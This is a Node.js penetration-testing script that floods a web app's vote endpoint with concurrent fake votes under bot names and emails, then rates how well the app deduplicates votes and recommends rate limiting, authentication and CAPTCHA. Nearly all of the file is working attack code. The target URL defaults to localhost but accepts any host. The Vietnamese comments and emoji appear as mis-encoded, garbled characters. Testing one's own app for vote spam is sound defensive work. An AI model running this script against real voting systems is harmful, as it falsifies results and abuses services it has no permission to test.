#!/usr/bin/env node

/**
 * PENTEST SCRIPT: Vote Flooding Attack
 *
 * Má»¥c tiÃªu: Táº¡o hÃ ng loáº¡t vote Ä‘á»ƒ kiá»ƒm tra kháº£ nÄƒng chá»‘ng spam
 * Severity: CRITICAL
 *
 * Usage:
 *   node 01-vote-flooding.js <infrastructure-id> [count] [base-url]
 *
 * Example:
 *   node 01-vote-flooding.js clx123abc 1000
 *   node 01-vote-flooding.js clx123abc 10000 http://localhost:3000
 */

const BASE_URL = process.argv[4] || 'http://localhost:3000';
const INFRASTRUCTURE_ID = process.argv[2];
const VOTE_COUNT = parseInt(process.argv[3] || '100', 10);

if (!INFRASTRUCTURE_ID) {
  console.error('âŒ Error: Infrastructure ID is required');
  console.log('Usage: node 01-vote-flooding.js <infrastructure-id> [count] [base-url]');
  process.exit(1);
}

console.log(`
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ğŸš¨ VOTE FLOODING ATTACK - PENTEST              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Target Infrastructure: ${INFRASTRUCTURE_ID}
Vote Count Target: ${VOTE_COUNT}
Base URL: ${BASE_URL}
Attack Type: Unlimited Vote Spam

[!] This will create ${VOTE_COUNT} votes without any validation
[!] Testing if the system has vote deduplication
`);

async function createVote(index) {
  const payload = {
    voterName: `Bot-${index}`,
    voterEmail: `bot${index}@pentest.local`
  };

  try {
    const response = await fetch(`${BASE_URL}/api/infrastructures/${INFRASTRUCTURE_ID}/vote`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (response.ok) {
      return { success: true, totalVotes: data.totalVotes, index };
    } else {
      return { success: false, error: data.error, index };
    }
  } catch (error) {
    return { success: false, error: error.message, index };
  }
}

async function runAttack() {
  console.log('ğŸš€ Starting vote flooding attack...\n');

  const startTime = Date.now();
  let successCount = 0;
  let failCount = 0;
  let lastTotalVotes = 0;

  // Attack vá»›i concurrency
  const BATCH_SIZE = 10; // Gá»­i 10 requests song song
  const batches = Math.ceil(VOTE_COUNT / BATCH_SIZE);

  for (let batch = 0; batch < batches; batch++) {
    const batchPromises = [];
    const batchStart = batch * BATCH_SIZE;
    const batchEnd = Math.min(batchStart + BATCH_SIZE, VOTE_COUNT);

    for (let i = batchStart; i < batchEnd; i++) {
      batchPromises.push(createVote(i + 1));
    }

    const results = await Promise.all(batchPromises);

    results.forEach(result => {
      if (result.success) {
        successCount++;
        lastTotalVotes = result.totalVotes;
        process.stdout.write(`\râœ… Success: ${successCount}/${VOTE_COUNT} | Total votes: ${lastTotalVotes}`);
      } else {
        failCount++;
        console.log(`\nâŒ Failed vote #${result.index}: ${result.error}`);
      }
    });

    // Delay nháº¹ giá»¯a cÃ¡c batch Ä‘á»ƒ trÃ¡nh overload
    if (batch < batches - 1) {
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  const endTime = Date.now();
  const duration = (endTime - startTime) / 1000;
  const votesPerSecond = (successCount / duration).toFixed(2);

  console.log(`\n\n${'='.repeat(60)}`);
  console.log('ğŸ“Š ATTACK SUMMARY');
  console.log('='.repeat(60));
  console.log(`âœ… Successful votes: ${successCount}`);
  console.log(`âŒ Failed votes: ${failCount}`);
  console.log(`ğŸ“ˆ Final vote count: ${lastTotalVotes}`);
  console.log(`â±ï¸  Duration: ${duration.toFixed(2)}s`);
  console.log(`âš¡ Rate: ${votesPerSecond} votes/second`);
  console.log('='.repeat(60));

  // Vulnerability assessment
  console.log('\nğŸ” VULNERABILITY ASSESSMENT:');
  if (successCount === VOTE_COUNT) {
    console.log('ğŸ”´ CRITICAL: All votes succeeded! No vote deduplication detected.');
    console.log('   â†’ System is vulnerable to unlimited vote manipulation');
    console.log('   â†’ Recommendation: Implement rate limiting and vote deduplication');
  } else if (successCount > VOTE_COUNT * 0.5) {
    console.log('ğŸŸ  HIGH: Majority of votes succeeded!');
    console.log('   â†’ Weak or partial protection detected');
  } else {
    console.log('ğŸŸ¢ GOOD: Most votes were blocked');
    console.log('   â†’ Some protection mechanism is working');
  }

  console.log('\nğŸ’¡ RECOMMENDATIONS:');
  console.log('  1. Implement one-vote-per-IP or one-vote-per-user rule');
  console.log('  2. Add rate limiting (e.g., 5 votes per hour per IP)');
  console.log('  3. Require authentication before voting');
  console.log('  4. Add CAPTCHA for additional protection');
  console.log('  5. Log and monitor suspicious voting patterns');
}

// Confirm trÆ°á»›c khi cháº¡y
console.log('âš ï¸  WARNING: This will flood the voting system!');
console.log('   Press Ctrl+C to cancel, or wait 3 seconds to continue...\n');

setTimeout(() => {
  runAttack().catch(error => {
    console.error('\nâŒ Attack failed:', error.message);
    process.exit(1);
  });
}, 3000);
